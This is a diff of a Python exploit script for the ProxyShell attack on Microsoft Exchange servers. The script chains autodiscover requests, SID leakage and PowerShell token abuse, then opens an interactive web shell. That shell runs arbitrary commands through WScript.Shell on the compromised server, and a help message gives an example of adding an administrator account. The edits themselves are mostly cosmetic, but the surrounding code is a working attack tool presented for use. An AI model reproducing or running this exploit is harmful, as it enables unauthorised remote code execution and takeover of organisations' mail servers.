@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+
 import argparse
 import base64
 import struct
@@ -57,14 +58,18 @@ class PwnServer(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
             return
 class ProxyShell:
+
     def __init__(self, exchange_url, email, verify=False):
+
         self.email = email
         self.exchange_url = exchange_url if exchange_url.startswith('https://') else f'https://{exchange_url}'
         self.rand_email = f'{rand_string()}@{rand_string()}.{rand_string(3)}'
         self.admin_sid = None
         self.legacydn = None
+        self.rand_subj = rand_string(16)
         self.session = requests.Session()
         self.session.verify = verify
+
     def post(self, endpoint, data, headers={}):
         path = ''
         if 'powershell' in endpoint:
@@ -91,6 +96,7 @@ class ProxyShell:
             print("bad powershell_token "+ str(t) + " but let try...")
             return self.token
     def get_sid(self):
+
         data = self.legacydn
         data += '\x00\x00\x00\x00\x00\xe4\x04'
         data += '\x00\x00\x09\x04\x00\x00\x09'
@@ -117,6 +123,7 @@ class ProxyShell:
         else:
             self.admin_sid = self.sid
     def get_legacydn(self):
+
         data = self.autodiscover_body()
         headers = {'Content-Type': 'text/xml'}
         r = self.post(
@@ -129,13 +136,16 @@ class ProxyShell:
         self.legacydn = re.findall('(?:<LegacyDN>)(.+?)(?:</LegacyDN>)', autodiscover_xml)[0]
 
     def autodiscover_body(self):
+
         autodiscover = ET.Element(
             'Autodiscover',
             xmlns='http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006'
         )
+
         request = ET.SubElement(autodiscover, 'Request')
         ET.SubElement(request, 'EMailAddress').text = self.email
         ET.SubElement(request, 'AcceptableResponseSchema').text = 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'
+
         return ET.tostring(
             autodiscover,
             encoding='unicode',
@@ -229,12 +239,14 @@ class ProxyShell:
 
 def exploit(proxyshell):
     proxyshell.get_legacydn()
-    proxyshell.get_token()
-    proxyshell.get_sid()
     print(f'legacyDN {proxyshell.legacydn}')
+
+    proxyshell.get_sid()
     print(f'leak_sid {proxyshell.sid}')
     print(f'admin_sid {proxyshell.admin_sid}')
+    proxyshell.get_token()
     print(f'powershell_token {proxyshell.token}')
+
     print('set_ews ' + str(proxyshell.set_ews()))
 
 def start_server(proxyshell, port):
@@ -285,6 +297,7 @@ def check_mail(exchange_url, fqdn, files):
             pass
         elif "<ErrorCode>" not in autodiscover_req.text:
             email = c_mail
+            #print(autodiscover_req.text)
             if autodiscover_req.text == "":
                 print("(-) " +exchange_url)
                 exit()
@@ -308,7 +321,7 @@ def exec_cmd(shell_url, code="exec_code"):
             print(req_test.text.split('!BD')[0].split('\n')[0])
             while True:
                 cmd = input("SHELL> ")
-                if cmd.lower() in ['exit', 'quit']:
+                if cmd.lower() == 'exit':
                 	exit(0)
                 shell_body_exec = '%s=Response.Write(new ActiveXObject("WScript.Shell").exec("%s").stdout.readall());'%(code, escape(cmd))
                 shell_req = requests.post(shell_url, headers={'Content-Type': 'application/x-www-form-urlencoded'},data=shell_body_exec,verify=False, timeout=20)
@@ -317,9 +330,9 @@ def exec_cmd(shell_url, code="exec_code"):
                 elif shell_req.status_code == 500:
                     print('av block exec command or you missing \\" ex: net localgroup \\"administrators\\" mrr0b0t /add')
                 else:
-                    print('shell ', shell_req)
+                    print('shell', shell_req)
         else:
-            print('shell ', req_test)
+            print('shell', req_test)
     except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout):
         print("target timeout")
         exit(0)
@@ -338,6 +351,7 @@ def main():
     exchange_url = "https://" + args.t
     fqdn = get_fqdn(exchange_url)
     print("fqdn " + fqdn)
+    #print("date " + x)
     email = ''
     if "administrator@domain.local" not in args.e:
         email = args.e
